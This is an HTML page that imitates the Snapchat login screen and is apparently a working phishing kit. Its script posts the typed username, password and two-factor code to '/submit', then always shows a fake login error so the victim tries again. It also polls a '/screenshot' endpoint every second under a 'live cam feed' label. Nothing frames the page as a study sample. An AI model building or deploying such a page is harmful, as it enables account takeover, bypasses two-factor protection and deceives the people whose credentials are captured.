<!DOCTYPE html>
<html>
<head>
    <title>Snapchat - Log In</title>
    <style>
        body { background: #fffc00; font-family: arial; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .box { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); width: 320px; text-align: center; }
        h2 { color: #000; margin-bottom: 20px; font-size: 22px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
        button { width: 100%; padding: 14px; background: #fffc00; border: none; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
        .live { margin-top: 20px; border: 2px solid #000; border-radius: 10px; overflow: hidden; background: #f0f0f0; min-height: 180px; display: flex; align-items: center; justify-content: center; }
        .live img { width: 100%; display: block; }
        .live-label { font-size: 12px; color: #666; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
        .error { color: #e60023; font-size: 14px; margin-top: 10px; display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Log In to Snapchat</h2>
        <input type="text" id="user" placeholder="Username or Email" autocomplete="off">
        <input type="password" id="pass" placeholder="Password" autocomplete="off">
        <input type="text" id="code" placeholder="6-Digit Code" maxlength="6" autocomplete="off">
        <button onclick="submit()">Log In</button>
        <div class="live">
            <div class="live-label">live cam feed</div>
            <img id="feed" src="/screenshot?t=0" onerror="this.style.display='none'; this.parentElement.innerHTML='<div style=\'padding:40px;color:#999;\'>feed offline</div>';">
        </div>
    </div>
    <script>
        function submit() {
            fetch('/submit', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    username: document.getElementById('user').value,
                    password: document.getElementById('pass').value,
                    code: document.getElementById('code').value
                })
            }).then(() => {
                alert('error logging in. please try again.');
            }).catch(() => {
                alert('error logging in. please try again.');
            });
        }
        setInterval(() => {
            const img = document.getElementById('feed');
            if (img) {
                img.src = '/screenshot?t=' + Date.now();
                img.style.display = 'block';
            }
        }, 1000);
    </script>
</body>
</html>
